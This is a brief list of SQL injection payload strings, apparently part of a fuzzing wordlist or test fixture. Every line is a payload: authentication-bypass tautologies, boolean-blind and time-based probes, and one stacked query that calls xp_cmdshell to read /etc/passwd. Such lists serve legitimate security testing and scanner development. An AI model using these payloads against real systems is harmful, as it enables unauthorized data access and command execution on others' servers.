    "1' GROUP BY columnnameshaving 1=1--"
    "'; EXEC xp_cmdshell 'cat /etc/passwd'--"
    "' OR 1=1#"
    "\" OR \"\"=\""
    "') OR ('1'='1"
    "' OR '1'='1' /*"
    "1 AND 1=1"
    "1 AND 1=2"
    "1' WAITFOR DELAY '0:0:5'--"
